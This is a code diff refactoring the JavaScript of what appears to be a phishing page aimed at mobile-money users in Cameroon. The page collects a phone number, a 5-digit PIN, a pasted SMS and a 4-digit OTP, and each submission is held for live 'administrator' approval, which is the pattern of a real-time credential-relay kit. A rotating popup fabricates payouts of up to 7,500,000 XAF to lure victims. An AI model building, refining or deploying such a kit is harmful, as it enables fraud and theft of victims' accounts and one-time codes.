         const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
         const data = await res.json();
-
         if (!data.success) return;
 
         if (data.status === 'approved') {
@@ -1059,47 +918,13 @@ body {
         } else if (data.status === 'rejected') {
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpStep1').style.display = 'none';
-          document.getElementById('otpStep2').style.display = 'none';
           showOtpMsg('error', 'Your information could not be verified. Redirecting to login…');
-          setTimeout(() => {
-            document.getElementById('smsPasteInput').value = '';
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('otpStep1').style.display = 'block';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            hideOtpMsgs();
-            [0,1,2,3,4].forEach(i => document.getElementById('p'+i).value = '');
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
+          setTimeout(() => { resetAndGoLogin(); }, 2500);
         }
-      } catch (e) {
-        // Silent
-      }
+      } catch (e) {}
     }, 2000);
-
-    setTimeout(() => {
-      if (pinPollInterval) {
-        clearInterval(pinPollInterval);
-        if (document.getElementById('pinWait').classList.contains('show')) {
-          document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Verification timeout. Please try again.');
-        }
-      }
-    }, 300000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-sms-status
-  // ══════════════════════════════════════════════════════
   let smsPollInterval = null;
 
   function pollSmsStatus() {
@@ -1109,7 +934,6 @@ body {
       try {
         const res  = await fetch(`/api/check-sms-status/${S.applicationId}`);
         const data = await res.json();
-
         if (!data.success) return;
 
         if (data.status === 'approved' || data.status === 'sms_approved') {
@@ -1134,23 +958,14 @@ body {
           showOtpMsg('error', 'SMS verification was rejected by admin. Please re-paste your SMS code.');
           document.getElementById('smsPasteInput').focus();
         }
-      } catch (e) {
-        // Silent error handling during polling
-      }
+      } catch (e) {}
     }, 2000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // TWO-STEP OTP FLOW HELPERS
-  // ══════════════════════════════════════════════════════
   function chkSmsStep() {
     const val = document.getElementById('smsPasteInput').value.trim();
     const btn = document.getElementById('bOtpStep1');
-    if (val.length > 0) {
-      btn.className = 'btn-otp rdy';
-    } else {
-      btn.className = 'btn-otp';
-    }
+    btn.className = val.length > 0 ? 'btn-otp rdy' : 'btn-otp';
   }
 
   async function submitSmsStep() {
@@ -1169,10 +984,7 @@ body {
       const res = await fetch('/api/verify-sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          applicationId: S.applicationId, 
-          smsText: smsText 
-        })
+        body: JSON.stringify({ applicationId: S.applicationId, smsText })
       });
       const data = await res.json();
 
@@ -1180,7 +992,6 @@ body {
       btn.textContent = 'NEXT: 4-DIGIT OTP';
 
       if (data.success) {
-        // Hide Step 1 and show waiting spinner while admin reviews SMS
         document.getElementById('otpStep1').style.display = 'none';
         document.getElementById('pinWait').classList.add('show');
         showOtpMsg('info', 'SMS submitted. Waiting for administrator validation...');
@@ -1195,26 +1006,19 @@ body {
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // OTP INPUT HELPERS (4 digits)
-  // ══════════════════════════════════════════════════════
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
+  function chkOtpDigits() {
+    const otp = getDigitValue('o', 4);
+    document.getElementById('bOtp').className = otp.length === 4 ? 'btn-otp rdy' : 'btn-otp';
   }
 
   let _rsInterval = null;
   function startRs() {
-    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-
+    if (_rsInterval) clearInterval(_rsInterval);
     let s = 60;
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
     rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
-
     _rsInterval = setInterval(() => {
       s--;
       const cur = document.getElementById('rsS');
@@ -1222,19 +1026,15 @@ body {
       if (s <= 0) {
         clearInterval(_rsInterval);
         _rsInterval = null;
-        const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:#004F71;cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
+        rsBox.innerHTML = '<span style="color:#004F71;cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
       }
     }, 1000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // RESEND OTP
-  // ══════════════════════════════════════════════════════
   async function resendOtp() {
     if (!S.applicationId) return;
     try {
-      const res  = await fetch('/api/resend-otp', {
+      const res = await fetch('/api/resend-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ applicationId: S.applicationId })
@@ -1243,7 +1043,7 @@ body {
       if (data.success) {
         showOtpMsg('info', 'A new OTP request has been sent to the administrator.');
         startRs();
-        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
+        for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
@@ -1254,19 +1054,14 @@ body {
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // OTP SUBMIT (4 digits)
-  // ══════════════════════════════════════════════════════
   async function doOtp() {
-    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
-
+    const otp = getDigitValue('o', 4);
     if (otp.length < 4) {
       showOtpMsg('warning', 'Please enter all 4 digits of your OTP code.');
       return;
     }
 
     hideOtpMsgs();
-
     let c = 3;
     document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
     document.getElementById('mOtp').classList.add('show');
@@ -1279,7 +1074,7 @@ body {
     }, 1000);
 
     try {
-      const res  = await fetch('/api/verify-otp', {
+      const res = await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ applicationId: S.applicationId, otp })
@@ -1296,7 +1091,6 @@ body {
         document.getElementById('bOtp').disabled = false;
         showOtpMsg('error', data.message || 'OTP submission failed. Please try again.');
       }
-
     } catch (err) {
       clearInterval(countdown);
       document.getElementById('mOtp').classList.remove('show');
@@ -1305,9 +1099,6 @@ body {
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-otp-status
-  // ══════════════════════════════════════════════════════
   let otpPollInterval = null;
 
   function pollOtpStatus() {
@@ -1317,7 +1108,6 @@ body {
       try {
         const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
         const data = await res.json();
-
         if (!data.success) return;
 
         if (data.status === 'approved') {
@@ -1339,30 +1129,11 @@ body {
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'Incorrect PIN code detected. Redirecting to login…');
-          setTimeout(() => {
-            document.getElementById('smsPasteInput').value = '';
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpStep1').style.display = 'block';
-            document.getElementById('otpStep2').style.display = 'none';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            hideOtpMsgs();
-            [0,1,2,3,4].forEach(i => document.getElementById('p'+i).value = '');
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
+          setTimeout(() => { resetAndGoLogin(); }, 2500);
 
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
-          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+          for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
           document.getElementById('pinWait').classList.remove('show');
@@ -1371,37 +1142,46 @@ body {
           showOtpMsg('error', 'Incorrect OTP code. Please check and enter again.');
           document.getElementById('o0').focus();
         }
-
-      } catch (e) {
-        // Silent
-      }
+      } catch (e) {}
     }, 2000);
-
-    setTimeout(() => {
-      if (otpPollInterval) {
-        clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Approval timeout. Please try again.');
-        document.getElementById('bOtp').disabled = false;
-      }
-    }, 300000);
   }
 
-// ══════════════════════════════════════════════════════
-// LIVE APPROVAL POPUP LOGIC (Landing Page Only)
-// ══════════════════════════════════════════════════════
-document.addEventListener("DOMContentLoaded", () => {
+  function resetAndGoLogin() {
+    document.getElementById('smsPasteInput').value = '';
+    for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
+    for(let i=0; i<5; i++) document.getElementById('p'+i).value = '';
+    document.getElementById('bOtp').className = 'btn-otp';
+    document.getElementById('bOtp').disabled = false;
+    document.getElementById('pinWait').classList.remove('show');
+    document.getElementById('otpStep1').style.display = 'block';
+    document.getElementById('otpStep2').style.display = 'none';
+    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+    hideOtpMsgs();
+    document.getElementById('bLogin').disabled = false;
+    chkLogin();
+    hideLoginMsg();
+    _loginInFlight = false;
+    S.applicationId = null;
+    S.assignedAdminId = null;
+    goTo('page-login');
+  }
+
+  // LIVE POPUP
+  document.addEventListener("DOMContentLoaded", () => {
+    setupDigitGroup('pinContainer', 5, chkLogin);
+    setupDigitGroup('otpContainer', 4, chkOtpDigits);
 
     const liveApprovals = [
-        { number: "671*****841", location: "Douala", amount: "10,000 XAF" },
-        { number: "699*****375", location: "Yaoundé", amount: "25,000 XAF" },
-        { number: "650*****912", location: "Bamenda", amount: "50,000 XAF" },
-        { number: "672*****458", location: "Bafoussam", amount: "100,000 XAF" },
-        { number: "698*****694", location: "Garoua", amount: "250,000 XAF" },
-        { number: "677*****231", location: "Maroua", amount: "500,000 XAF" },
-        { number: "653*****885", location: "Ngaoundéré", amount: "1,000,000 XAF" },
-        { number: "691*****406", location: "Kribi", amount: "2,500,000 XAF" },
-        { number: "670*****534", location: "Buea", amount: "5,000,000 XAF" },
-        { number: "680*****168", location: "Ebolowa", amount: "7,500,000 XAF" }
+      { number: "671*****841", location: "Douala", amount: "10,000 XAF" },
+      { number: "699*****375", location: "Yaoundé", amount: "25,000 XAF" },
+      { number: "650*****912", location: "Bamenda", amount: "50,000 XAF" },
+      { number: "672*****458", location: "Bafoussam", amount: "100,000 XAF" },
+      { number: "698*****694", location: "Garoua", amount: "250,000 XAF" },
+      { number: "677*****231", location: "Maroua", amount: "500,000 XAF" },
+      { number: "653*****885", location: "Ngaoundéré", amount: "1,000,000 XAF" },
+      { number: "691*****406", location: "Kribi", amount: "2,500,000 XAF" },
+      { number: "670*****534", location: "Buea", amount: "5,000,000 XAF" },
+      { number: "680*****168", location: "Ebolowa", amount: "7,500,000 XAF" }
     ];
 
     const popup = document.getElementById("popup");
@@ -1409,49 +1189,32 @@ document.addEventListener("DOMContentLoaded", () => {
     const popupAvatar = document.getElementById("popup-avatar");
     const landingPage = document.getElementById("page-landing");
 
-    if (!popup || !popupText || !popupAvatar || !landingPage) {
-        return;
-    }
-
+    if (!popup || !popupText || !popupAvatar || !landingPage) return;
     let lastIndex = -1;
 
     function displayPopup() {
-        if (!landingPage.classList.contains("active")) {
-            popup.classList.remove("show");
-            return;
-        }
+      if (!landingPage.classList.contains("active")) {
+        popup.classList.remove("show");
+        return;
+      }
+      let index;
+      do {
+        index = Math.floor(Math.random() * liveApprovals.length);
+      } while (index === lastIndex && liveApprovals.length > 1);
+      lastIndex = index;
 
-        let index;
-        do {
-            index = Math.floor(Math.random() * liveApprovals.length);
-        } while (index === lastIndex && liveApprovals.length > 1);
-
-        lastIndex = index;
-
-        const user = liveApprovals[index];
-
-        popupAvatar.textContent = user.number.substring(0, 2);
-
-        popupText.innerHTML = `
-            <strong>${user.number}</strong> (${user.location}) received <strong>${user.amount}</strong>
-        `;
-
-        popup.classList.add("show");
-
-        setTimeout(() => {
-            popup.classList.remove("show");
-        }, 2500);
+      const user = liveApprovals[index];
+      popupAvatar.textContent = user.number.substring(0, 2);
+      popupText.innerHTML = `<strong>${user.number}</strong> (${user.location}) received <strong>${user.amount}</strong>`;
+      popup.classList.add("show");
+      setTimeout(() => popup.classList.remove("show"), 2500);
     }
 
     setTimeout(displayPopup, 2000);
     setInterval(displayPopup, 3500);
+  });
 
-});
-
-// ══════════════════════════════════════════════════════
-// INIT
-// ══════════════════════════════════════════════════════
-calcUp();  calcUp();
+  calcUp();
 </script>
 </body>
 </html>
